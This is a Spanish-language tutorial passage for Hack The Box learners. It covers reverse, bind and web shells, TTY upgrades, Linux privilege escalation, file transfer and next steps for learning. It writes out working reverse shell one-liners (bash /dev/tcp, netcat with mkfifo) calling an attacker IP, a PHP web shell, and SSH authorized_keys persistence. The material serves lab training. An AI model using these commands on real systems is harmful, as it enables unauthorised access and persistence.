Un shell no es más que acceso directo a la consola del sistema remoto, ya sea Bash en Linux o PowerShell en Windows. En ocasiones podremos acceder usando protocolos “legítimos” como SSH o WinRM, pero salvo que tengamos credenciales válidas, normalmente primero necesitaremos **obtener una shell** mediante la explotación de una vulnerabilidad.

De forma general, nos encontraremos tres tipos de shells: **reverse shell, bind shell y web shell**. Todas sirven para ejecutar comandos, pero cada una se comunica con nosotros de una manera distinta y tiene ventajas e inconvenientes.

### Reverse Shell – Entra una llamada

La _reverse shell_ es la más habitual y, en la mayoría de escenarios, la más rápida de conseguir. La idea es sencilla: nosotros dejamos un puerto abierto escuchando en nuestra máquina y forzamos al sistema comprometido a conectarse de vuelta a nosotros y entregarnos su shell.

Primero levantamos un listener con netcat:

```bash
nc -lvnp 1234
```

Con esto dejamos nuestro sistema esperando una conexión entrante en el puerto 1234. Ahora necesitamos saber **a qué IP debe conectarse el objetivo**. En entornos como Hack The Box, esta IP será la de la interfaz `tun0`, ya que toda la comunicación pasa por la VPN.

```js
ip a
```

Una vez tenemos la IP correcta, ejecutamos en el sistema víctima un comando de reverse shell. Dependiendo del sistema operativo y de las herramientas disponibles, el comando variará. Algunos ejemplos fiables son:

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

```js
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

En Windows, normalmente recurriremos a PowerShell con un payload más largo pero igual de efectivo.

Si todo va bien, veremos cómo el sistema se conecta a nuestro listener y ya podremos ejecutar comandos directamente:

```ls
id
```

La gran ventaja de la reverse shell es su rapidez. La desventaja es que **es frágil**: si se corta la conexión o el proceso muere, tendremos que volver a explotar el sistema para recuperarla.

### Bind Shell – Toc Toc, soy yo

La _bind shell_ funciona al revés. En lugar de que el sistema se conecte a nosotros, hacemos que el sistema víctima **abra un puerto y se quede escuchando**, esperando que nos conectemos.

Ejecutamos en el sistema comprometido un comando que “ata” la shell a un puerto, por ejemplo:

```js
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

Una vez hecho esto, desde nuestra máquina simplemente nos conectamos:

```js
nc 10.10.10.1 1234
```

La principal ventaja aquí es que, si perdemos la conexión, podemos volver a conectarnos mientras el proceso siga vivo. El problema es que **requiere que el puerto esté accesible**, algo que no siempre ocurre por firewalls o reglas de red.

### Haciendo la shell usable: upgrade de TTY

Las shells obtenidas con netcat suelen ser muy limitadas: no hay historial, no funcionan bien las teclas, no podemos usar editores cómodamente… Para solucionar esto, conviene **convertir la shell en una TTY completa**.

Un método muy común es usar Python:

```c
python -c 'import pty; pty.spawn("/bin/bash")'
```

Después, hacemos `CTRL+Z`, ajustamos la terminal local y recuperamos la sesión:

```c
stty raw -echo fg
```

Finalmente, ajustamos las variables de entorno para que la shell se vea correctamente:

```js
export TERM=xterm-256color stty rows 67 columns 318
```

Con esto, la shell se comportará prácticamente igual que una sesión SSH.

### Web Shell – No port? No problem

El último tipo es la _web shell_. En lugar de abrir conexiones nuevas, se apoya en el propio servidor web. Básicamente es un pequeño script (PHP, ASPX, JSP…) que recibe comandos por HTTP, los ejecuta y devuelve el resultado.

Un ejemplo clásico en PHP es este:

```php
<?php system($_REQUEST["cmd"]); ?>
```

Una vez subido al servidor (normalmente mediante una vulnerabilidad de subida de archivos o escribiéndolo directamente en el _webroot_), podremos ejecutar comandos accediendo a la URL:

```php
http://SERVER_IP/shell.php?cmd=id
```

La gran ventaja de la web shell es que **suele esquivar firewalls**, ya que funciona sobre el puerto web (80/443). Además, si el sistema se reinicia, la shell sigue ahí. La desventaja es clara: no es interactiva y resulta más lenta para trabajar, aunque se puede automatizar.

## Capitulo 11: Me faltan llaves para seguir

Casi nunca el acceso inicial a una máquina nos da control total. Lo normal es entrar como un usuario de bajo privilegio (www-data, un user random, etc.), lo justo para ejecutar comandos, pero no para mandar de verdad. Si queremos control total, toca escalar privilegios hasta **root en Linux** o **Administrator / SYSTEM en Windows**.

A partir de aquí, el objetivo es simple: **buscar una debilidad interna del sistema que nos permita subir de nivel**.

### Enumerar antes de romper nada

Una vez dentro, lo primero no es explotar a lo loco, sino **enumerar bien el sistema**. Aquí es donde entran en juego las checklists y los cheat sheets.

Dos recursos que considero casi obligatorios:

- **HackTricks** → checklists muy bien organizadas para Linux y Windows.
- **PayloadsAllTheThings** → tanto payloads como guías de privesc.

La clave es ir probando comandos, entendiendo _por qué_ algo es vulnerable y no limitarse a copiar-pegar.

### Scripts de enumeración (sí, pero con cabeza)

Muchos de los chequeos manuales se pueden automatizar con scripts que revisan el sistema en busca de configuraciones débiles.

Algunos clásicos:

- **Linux**: LinEnum, linuxprivchecker
- **Windows**: Seatbelt, JAWS
- **Multiplataforma**: **PEASS (LinPEAS / WinPEAS)**

Estos scripts generan informes enormes, pero muy bien coloreados y señalizando lo importante. Aun así, **no son magia**: hay que saber interpretar lo que sale.

**Ojo**: hacen mucho ruido. En entornos reales pueden saltar alertas o incluso bloquearse. A veces es mejor enumerar a mano.

### Kernel exploits: el martillo grande

Si el sistema es antiguo o está mal parcheado, **el kernel es el primer sitio donde mirar**.

Ejemplo:

- Kernel Linux `3.9.0-73-generic`
- Buscas exploits → aparece **DirtyCow (CVE-2016-5195)**

Esto suele dar root directamente, pero:

- Puede romper el sistema
- Nunca se lanza en producción sin permiso explícito
- Ideal probarlo primero en laboratorio

En Windows pasa exactamente lo mismo con versiones antiguas sin parches.

### Software vulnerable instalado

Otro clásico: **software viejo**.

En Linux:
```ls
dpkg -l
```

En Windows:

- `C:\Program Files`
- `C:\Program Files (x86)`

Si algo está desactualizado, se busca exploit público y se evalúa si sirve para privesc.

### Privilegios del usuario: Una grieta que lleva a un agujero

Aquí es donde muchas máquinas caen.
#### sudo (Linux)

Mirar siempre:

```bash
sudo -l
```

Si ves algo tipo:

```js
(ALL : ALL) ALL
```

root directo.

Si ves NOPASSWD:

```js
(user : user) NOPASSWD: /bin/echo
```

Entonces puedes ejecutar ese binario sin contraseña. Con **GTFOBins** muchas veces eso es suficiente para sacar una shell como root.

Ejemplo:

```bash
sudo -u user /bin/echo hola
```

Si el binario está en GTFOBins, probablemente hay forma de abusarlo.

### Tareas programadas y cron jobs

Las tareas automáticas son oro puro.

En Linux, mirar:

- `/etc/crontab`
- `/etc/cron.d`
- `/var/spool/cron/crontabs/root`

Si puedes **escribir en algo que ejecuta root**, puedes meter un script malicioso (por ejemplo, una reverse shell) y esperar.

En Windows pasa lo mismo con tareas programadas.

### Credenciales expuestas (muy comunes)

Archivos de configuración, logs, historiales… siempre hay basura sensible.

Ejemplo típico:

```php
$conn = new mysqli('localhost', 'db_user', 'password123');
```

Con esa contraseña:

- Probar bases de datos
- Probar `su`
- Probar SSH
- Probar reutilización de credenciales

Muchas máquinas mueren aquí sin necesidad de exploits.

### SSH keys: acceso limpio y persistente

Si puedes **leer**:

```ls
/home/user/.ssh/id_rsa /root/.ssh/id_rsa
```

Copias la clave, ajustas permisos y entras:

```ls
chmod 600 id_rsa ssh root@IP -i id_rsa
```

Si puedes **escribir** en `.ssh/authorized_keys`, aún mejor: metes tu clave pública y tienes acceso persistente sin contraseña.

Generar clave:

```ls
ssh-keygen -f key
```

Añadirla:

```ls
echo "ssh-rsa AAAA... user@host" >> /root/.ssh/authorized_keys
```

Y listo:

```ls
ssh root@IP -i key
```

## Capitulo 12: You've got mail

En cualquier ejercicio de pentesting llega un momento inevitable: **hay que mover archivos**. Ya sea subir scripts de enumeración, exploits, binarios o bajar información interesante desde la máquina comprometida. Si usamos Meterpreter esto es trivial, pero con una **reverse shell normal** hay que saber apañarse.

La idea es simple: **enviar cosas al objetivo o sacarlas de ahí**, usando lo que tengamos disponible.

### Servidor HTTP rápido (wget / curl)

El método más cómodo cuando el objetivo puede salir a nuestra máquina.

En nuestro lado, nos vamos al directorio donde esté el archivo y levantamos un servidor HTTP rápido con Python:

```ls
cd /tmp
python3 -m http.server 8000
```

Con esto estamos sirviendo los archivos por el puerto 8000.

Desde la máquina remota, descargamos el archivo con `wget`:

```http
wget http://10.10.14.1:8000/linenum.sh
```

Si `wget` no está disponible (muy común), usamos `curl`:

```http
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```

Aquí:

- `10.10.14.1` es nuestra IP (tun0 en HTB)
- `-o` indica el nombre del archivo de salida

Simple, rápido y efectivo.

### SCP (si tenemos SSH)

Si ya tenemos **credenciales SSH válidas**, SCP es probablemente la opción más limpia.

Desde nuestra máquina:

```ls
scp linenum.sh user@remotehost:/tmp/linenum.sh
```

Introducimos la contraseña y listo.  
Todo lo que va después de `:` es la ruta remota donde se guardará el archivo.

### Base64: cuando todo lo demás falla

Hay situaciones donde:

- El firewall bloquea descargas
- No hay wget ni curl
- No hay salida a red

Aquí entra el método más feo pero más fiable: **Base64**.

En nuestra máquina, codificamos el archivo:
```ls
base64 shell -w 0
```

Esto devuelve una cadena enorme en base64.  
La copiamos y en la máquina remota hacemos:

```js
echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... | base64 -d > shell
```

Con esto reconstruimos el archivo original byte a byte.

### Verificar que el archivo está bien

Siempre conviene comprobar que el archivo no se ha corrompido.

Primero, comprobar el tipo:

```js
file shell
```

Ejemplo de salida correcta:

```c
ELF 64-bit LSB executable
```

Después, comprobar el hash MD5.

En nuestra máquina:

```c
md5sum shell
```

En la máquina remota:

```c
md5sum shell
```

Si ambos hashes coinciden, la transferencia es **100% correcta**.

### Resumen rapido

Mover archivos no es hacking avanzado, pero **sin esto estás vendido**.  
Cuantas más técnicas conozcas, menos dependerás del entorno.

- Si hay red → HTTP  
- Si hay credenciales → SCP  
- Si no hay nada → Base64

Y siempre, **verifica lo que subes**.

## Capitulo 13: Mirando el camino

Llegados a este punto, ya hemos cubierto una base sólida. No somos expertos, pero tampoco estamos dando palos de ciego. Ahora toca algo igual de importante que aprender comandos o herramientas: **decidir hacia dónde seguimos caminando** y cómo hacerlo sin perdernos por el camino.

Hack The Box no es solo una plataforma para “romper máquinas”. Bien usada, es un entorno perfecto para construir **habilidad real**, **criterio técnico** y, con el tiempo, un **portfolio serio en seguridad ofensiva**. Este capítulo no va de técnica, va de **siguientes pasos**.

### Boxes y retos: subir el listón poco a poco

Después de completar una primera máquina fácil, es normal sentirse con confianza… y ahí es donde mucha gente se equivoca. El progreso no va de saltar directamente a lo difícil, sino de **acumular experiencia de forma inteligente**.

Un buen siguiente paso es **rootear una máquina retirada de dificultad Easy**. Las máquinas retiradas permiten acceder a walkthroughs completos, y eso es una ventaja enorme si se usa bien. No se trata de copiar y pegar comandos, sino de **entender el porqué de cada paso**.

Un consejo muy útil aquí es ver primero un walkthrough en vídeo, entender el flujo general del ataque, y después **intentar repetirlo sin seguir el vídeo paso a paso**. Si te bloqueas, vuelves a consultar el walkthrough. Este proceso enseña mucho más que simplemente reproducir comandos.

Cuando varias máquinas Easy empiezan a resultarte cómodas, es el momento de **subir a Medium**. Aquí suelen aparecer conceptos que no siempre están presentes en las fáciles: vectores menos obvios, encadenamiento de fallos o una enumeración más exigente. No es frustración, es aprendizaje.

### La primera máquina activa: sin red de seguridad

Uno de los hitos más importantes en Hack The Box es completar **tu primera máquina activa** sin walkthrough. No porque sea la más difícil técnicamente, sino porque es la primera vez que dependes **solo de ti**.

Lo ideal es llegar aquí después de haber completado entre **5 y 10 máquinas retiradas Easy/Medium**. Cuando elijas tu primera máquina activa, busca una Easy . Aun así, probablemente será dura. Y eso es buena señal.

Bloquearte, dudar y tener que volver atrás forma parte del proceso. Significa que estás pensando. Una vez completes esa primera máquina activa, el resto empieza a encajar mejor. A partir de ahí, puedes repetir el proceso con más máquinas activas y, poco a poco, con Medium o incluso Hard.

### Seguir aprendiendo (de verdad)

Aunque las máquinas y los retos son una forma excelente de aprender, **no cubren todo**. Cada box suele centrarse en uno o dos conceptos concretos, y eso puede dejar lagunas importantes si solo aprendemos a base de walkthroughs.

Por eso es clave **combinar boxes con aprendizaje guiado**, como los módulos de Academy. Si detectas que siempre fallas en web, Active Directory, pivoting o privesc, lo lógico no es seguir haciendo boxes al azar, sino **reforzar ese punto concreto**.

Una buena práctica es tener una lista personal de módulos pendientes. Cada vez que sientas que te falta base en algo, vuelves a esa lista y atacas el siguiente módulo. Así el aprendizaje deja de ser caótico y pasa a ser intencional.

### Devolver algo a la comunidad

En algún momento habrás usado los canales de ayuda, foros o pistas de otras personas para avanzar. Eso nos ha pasado a todos. Cuando termines una máquina, es buena práctica **volver y ayudar a otros** que estén atascados donde tú lo estuviste.

Explicar algo a otra persona no solo es devolver el favor, es una de las mejores formas de afianzar conocimientos. Además, participar en la comunidad mejora tu visibilidad y tu perfil dentro del sector.

### Documentar y compartir walkthroughs

Documentar lo que haces no es opcional si quieres dedicarte a esto profesionalmente. Mientras trabajas una máquina, deberías estar apuntando comandos, decisiones y hallazgos. No solo para ti, sino porque **saber documentar es una habilidad obligatoria para cualquier pentester**.

Un buen ejercicio es coger tu mejor walkthrough de una máquina retirada, ampliarlo, limpiarlo y convertirlo en un writeup completo. Publicarlo ayuda a otros, refuerza tu aprendizaje y empieza a construir tu presencia técnica.

Lo ideal es preparar walkthroughs de máquinas que acabas de completar en activo y publicarlos cuando pasen a retiradas. Así aportas contenido relevante y actualizado.

### El camino no se acaba aquí

Incluso después de todo esto, aún queda muchísimo por hacer. Hack The Box está lleno de oportunidades para seguir creciendo. Algunos objetivos razonables a medio plazo pueden ser:

- Rootear máquinas retiradas Easy y Medium
- Completar máquinas activas
- Resolver retos de dificultad creciente
- Compartir walkthroughs bien documentados
- Completar módulos ofensivos de Academy
- Enfrentarse a boxes Medium y Hard en activo
- Completar tracks y labs avanzados

No hay prisa. No es una carrera.  
Pero hay una regla que nunca cambia:

**El día que dejas de aprender, dejas de avanzar.**